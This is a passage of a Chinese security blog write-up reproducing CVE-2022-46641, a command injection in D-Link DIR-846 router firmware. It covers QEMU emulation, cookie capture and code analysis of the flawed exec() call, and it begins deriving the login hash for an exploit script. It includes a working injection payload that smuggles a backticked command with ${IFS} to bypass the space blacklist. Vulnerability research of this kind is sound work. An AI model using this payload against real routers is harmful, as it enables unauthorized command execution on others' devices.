<p>然后，我们需要下载qemu-system模拟debain系统的内核文件和硬盘文件（<del>下载（×），找师兄白嫖（√）</del>）：</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230104155438600.png" alt="image-20230104155438600"  />
</p>
<p>接下来使用命令开启qemu-system:</p>
<pre tabindex="0"><code>sudo qemu-system-mipsel -M malta -m 512 \
-kernel vmlinux-3.2.0-4-4kc-malta-x86 \
-hda debian_wheezy_mipsel_standard.qcow2 \
-append &#34;root=/dev/sda1 console=ttyS0&#34; \
-net nic,macaddr=00:19:3e:00:00:01  -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no
</code></pre><blockquote>
<p><code>-kernel</code>：选择内核版本，这里选择lighttpd符合的版本</p>
<p><code>-hda</code>：选择硬盘文件</p>
<p><code>-nographic</code>：不适用GUI图形界面</p>
<p><code>-net nic -net tap,ifname=tap0,script=no,downscript=no</code>：选择桥接模式，使用刚刚我们创建的网卡</p>
</blockquote>
<p>启动成功后，给qemu-system分配ip：</p>
<pre tabindex="0"><code>ifconfig eth0 &lt;your-ip&gt;
</code></pre><p>然后使用scp将固件中的linux根目录传进qemu-system（注：这里需要先将固件的根目录打包，再传入qemu-system，否则scp将会破坏掉固件中的软连接）</p>
<p>随后解压，挂载debian系统的/proc和/dev：</p>
<pre tabindex="0"><code>mount --bind /proc ./proc
mount --bind /dev ./dev
chroot . /bin/bash
</code></pre><p>最后启动服务：</p>
<p>**注：**在启动过程中会遇到如缺少文件的报错，这种报错缺少什么文件我们就创建什么文件就好了</p>
<pre tabindex="0"><code>./etc/init.d/php7-fastcgi start
./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf
</code></pre><p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230104161305384.png" alt="image-20230104161305384"  />
</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230104161327014.png" alt="image-20230104161327014"  />
</p>
<h3 id="漏洞复现">漏洞复现<a hidden class="anchor" aria-hidden="true" href="#漏洞复现">#</a></h3>
<p>**注：**该漏洞需要登陆获取cookie</p>
<p>首先我们来到路由器登陆界面开启抓包：</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230112112931132.png" alt="image-20230112112931132"  />
</p>
<p>输入密码后看到抓包：</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230112113035189.png" alt="image-20230112113035189"  />
</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230112113049780.png" alt="image-20230112113049780"  />
</p>
<p>这里我们可以看到抓到了两个登陆的包。具体的原因我们后面编写exp时会提到，这里我们先使用第二个登陆包里的cookie</p>
<p>将这个cookie复制到poc上，就可以执行命令了：</p>
<pre tabindex="0"><code>{&#34;SetIpMacBindSettings&#34;:{&#34;lan_unit&#34;:&#34;0&#34;,&#34;lan(0)_dhcps_staticlist&#34;:&#34;1,`touch${IFS}/tmp/yorktown`asdasdasd,12:34:56:78:90:11,192.168.0.9&#34;}}
</code></pre><p>这里我修改了命令，原poc的命令是reboot，太大开大合了，相比之下创建一个文件显得十分的低调。<del>符合黑客低调的行事风格（雾）</del></p>
<p>复现结果如下</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230112113914254.png" alt="image-20230112113914254"  />
</p>
<h3 id="漏洞点代码分析">漏洞点代码分析<a hidden class="anchor" aria-hidden="true" href="#漏洞点代码分析">#</a></h3>
<p>根据git上的poc我们可以看到，该漏洞是存在于 <code>/www/HNAP1/control/SetIpMacBindSettings.php</code>文件中</p>
<p>对源码的分析，我们可以看到源码的原本流程大致是对路由器上的mac地址做一个记录和修改。但是因为没有对传入的参数做足够的限制，所以导致了命令注入.</p>
<p>大概的流程为：</p>
<pre tabindex="0"><code>#SetIpMacBindSettings.php:35
$staticlist = explode(&#34;;&#34;, $option[&#39;lan(0)_dhcps_staticlist&#39;]);
</code></pre><p>这里是读取了poc上带有命令的字段，为了直观感受，我在源码中输出了这个值：</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230112115202329.png" alt="image-20230112115202329"  />
</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230112115430290.png" alt="image-20230112115430290"  />
</p>
<p>随后，进入循环，将值赋给 <code>$val</code>：</p>
<pre tabindex="0"><code>#SetIpMacBindSettings.php:74
foreach ($staticlist as $val) 
</code></pre><p>接下来，代码会将我们输入的值根据 <code>“,”</code>分割：</p>
<pre tabindex="0"><code>#SetIpMacBindSettings.php:75
$vl_arr = explode(&#34;,&#34;, $val);
</code></pre><p>所以我们的命令存放在 <code>$val[1]</code>中，</p>
<p>最后跟随着另外的命令一起执行：</p>
<pre tabindex="0"><code>#SetIpMacBindSettings.php:80
exec(&#34;changename.sh &#34; . $vl_arr[2] . &#34; &#34; . $vl_arr[1]);
</code></pre><p>当然，在源码中，开发者对输入的字符进行了限制，其目的就是为了防止命令的注入。但是很明显，这种限制是会被攻击者轻松绕过的。</p>
<p>例如如下代码：</p>
<pre tabindex="0"><code>#SetIpMacBindSettings.php:54
$special_char_arr = array(&#34;\&#39;&#34;, &#34; &#34;, &#34;\&#34;&#34;);
                if (contains_special_char($vl_arr[1], $special_char_arr)) {
                    $result[&#34;message&#34;] = &#34;specil character.&#34;;
                    $this-&gt;api_response(__CLASS__, $result);
                }



#HNAP1/core/fun/public.php:420
function contains_special_char($str, $special_char_arr)
{
    for ($i = 0; $i &lt; count($special_char_arr); $i++) {
        if (strpos($str, $special_char_arr[$i]) !== false) {
            return true;
        }
    }
    return false;
}
</code></pre><p>可以看到上面的代码，首先生成了一个黑名单，然后将黑名单和我们输入的字符放入 <code>contains_special_char</code>函数中，通过观察函数的定义，我们也可以判断这是一个对特殊字符进行检测的函数。</p>
<p>但是问题恰恰出在这里，因为只检测了空格符号和转义符，但是当我们使用如 <code>${IFS} \t</code>等可以代替空格的符号时，就可以绕过检测，从而非法执行命令。</p>
<h3 id="exp编写">exp编写<a hidden class="anchor" aria-hidden="true" href="#exp编写">#</a></h3>
<p>通过上面的漏洞复现，我们可以知道exp需要经历的流程：</p>
<pre tabindex="0"><code>第一次登陆——》第二次登陆——》获取cookie——》发送命令
</code></pre><p>那么，为什么登陆时会有发送两个包，这两个包有什么关系吗？</p>
<p>通过在浏览器里的记录（开发者模式中对网络发包的记录），我们可以找到一些线索：</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230112141419790.png" alt="image-20230112141419790"  />
</p>
<p>这是第一次登陆发送的包头，而返回的包头中多出来了一个<code>Set-Cookie</code>的字段：</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230112141525369.png" alt="image-20230112141525369"  />
</p>
<p>然后第二次登陆的请求头中，就将这个字段当作了cookie的一部分：</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230112141709593.png" alt="image-20230112141709593"  />
</p>
<p>同时在cookie中多出来了两个别的字段，而这两个字段则是来自上一个返回包的数据部分：</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230112141828995.png" alt="image-20230112141828995"  />
</p>
<p>这里可以看到uid是直接把返回包的cookie字段复制过去了，但是<code>privatekey</code>是怎么得到的呢？</p>
<p>我们只能又去找源码了。</p>
<p>因为我们是通过<code>login.html</code>点击登陆按钮开始发包的，所以可以从这个文件寻找按钮事件开始寻找：</p>
<pre tabindex="0"><code>#/www/login.html:404
&lt;td&gt;&lt;input type=&#34;button&#34; value=&#34;&#34; id=&#34;logIn_btn&#34; class=&#34;styled_button_long&#34; onClick=&#34;OnClickLogin();&#34;&gt;&lt;/td&gt;
</code></pre><p>通过这个onClinck事件，我们可以追朔到 <code>\www\Login.html:243</code></p>
<p>这里定义了点击登陆按钮之后的流程，这里的具体流程我们可以不用了解，但是我们需要关注一段代码：</p>
<pre tabindex="0"><code>#\www\Login.html:244
var Login_Password = document.getElementById(&#34;admin_Password1&#34;).value;
var Login_Captcha = &#34;&#34;;
document.getElementById(&#34;logIn_btn&#34;).disabled = true;
document.getElementById(&#34;error_1&#34;).style.display = &#34;none&#34;;
doLogin(Login_Password, Login_Captcha)
</code></pre><p>这一段代码，就是将我们在网页上输入的密码，传入了一个叫做 <code>doLogin()</code>的函数。</p>
<p>根据经验，我们可以猜测，这个函数里就是处理密码的地方 <del>根据经验（×），这么大一个login就写在上面（√）</del></p>
<p>通过寻找，我们追寻到了 <code>\www\js\Login.js</code></p>
<p>在这里我们就可以看到上面<code>privatekey</code>的来历了：</p>
<pre tabindex="0"><code>#\www\js\Login.js:16
PrivateKey = md5(obj.PublicKey + ifLogin_Password + obj.Challenge);
PrivateKey = PrivateKey.toUpperCase();		//将PrivateKey全改为大写
</code></pre><p>这个 <code>ifLogin_Password</code> 就是咱们传进来的密码</p>
<p>现在我们知道这个<code>privatekey</code>是怎么来的了。</p>
<p>但是我们先不要着急，因为在下面，有一个非常重要的东西就是密码的加密过程：</p>
<pre tabindex="0"><code>#\www\js\Login.js:28
$.cookie(&#39;PrivateKey&#39;, PrivateKey, {path: &#39;/&#39;});
var Login_Passwd = md5(PrivateKey + obj.Challenge);
Login_Passwd = Login_Passwd.toUpperCase();
</code></pre><p>到这里，整个密码的加密过程就完整了：</p>
<pre tabindex="0"><code>先使用md5加密（PublicKey + Password + Challenge）得到privatekey，然后再使用md5加密（privatekey + Challenge）
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
